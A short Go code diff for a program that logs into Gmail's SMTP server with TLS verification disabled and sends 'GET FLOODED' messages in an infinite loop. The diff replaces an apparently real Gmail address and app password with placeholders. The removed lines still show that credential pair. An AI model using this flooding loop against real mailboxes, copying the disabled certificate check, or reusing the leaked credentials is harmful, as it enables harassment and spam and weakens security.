@@ -8,7 +8,7 @@ import (
 )
 
 func main() {
-	d := gomail.NewDialer("smtp.gmail.com", 587, "t0031692@gmail.com", "satk afpv gxpn ldjc")
+	d := gomail.NewDialer("smtp.gmail.com", 587, "email here", "app password here")
 	d.TLSConfig = &tls.Config{InsecureSkipVerify: true}
 	email, err := d.Dial()
 	if err != (nil) {
@@ -16,7 +16,7 @@ func main() {
 	}
 	for {
 		var msg *bytes.Buffer = bytes.NewBuffer([]byte("GET FLOODED!!!!!!!!"))
-		email.Send("t0031692@gmail.com", []string{"t0031692@gmail.com"}, msg)
+		email.Send("email here", []string{"email here"}, msg)
 
 	}
 }
